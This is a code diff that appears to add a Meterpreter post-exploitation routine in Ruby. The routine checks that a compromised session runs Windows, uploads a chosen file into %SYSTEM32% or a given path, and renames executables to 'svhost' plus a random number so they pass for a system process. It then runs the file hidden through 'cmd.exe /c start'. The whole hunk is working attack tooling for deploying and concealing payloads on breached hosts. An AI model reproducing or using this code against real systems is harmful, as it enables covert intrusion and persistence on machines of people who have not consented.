@@ -63,3 +63,56 @@ trgloc = datastore['path']
 file = datastore['upload']
 sysnfo = session.sys.config.sysinfo
 
+
+unsupported if client.platform !~ /win32|win64/i
+
+# -------------------------------------
+def unsupported
+   sys = session.sys.config.sysinfo
+   print_error("Operative System: #{sys['OS']}")
+   print_error("This auxiliary only works against windows systems!")
+   print_error("Please execute [info] for further information...")
+   raise Rex::Script::Completed
+   print_line("")
+end
+
+
+def upload(session,file,trgloc)
+	if not ::File.exists?(file)
+		raise "#{file} to Upload does not exists!"
+	else
+		if trgloc == ""
+		location = session.fs.file.expand_path("%SYSTEM32%")
+		else
+			location = trgloc
+
+		end
+		begin
+			ext = file[file.rindex(".") .. -1]
+			if ext and ext.downcase == ".exe"
+				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
+			else
+				fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
+			end
+                        print_line("")
+			print_status("Uploading => #{file}...")
+			session.fs.file.upload_file("#{fileontrgt}","#{file}")
+			print_status("#{file} uploaded! to => #{fileontrgt}")
+
+                           r=''
+                           r = session.sys.process.execute("cmd.exe /c start #{fileontrgt}", nil, {'Hidden' => true, 'Channelized' => true})
+                           print_good("Execute => #{file}")
+                           print_status("agent uploaded and executed successfully!")
+                           print_line("")
+
+                     # close channel when done
+                     r.channel.close
+                     r.close
+		rescue ::Exception => e
+			print_status("Error uploading file #{file}: #{e.class} #{e}")
+                        print_line("")
+			raise e
+		end
+	end
+	return fileontrgt
+end
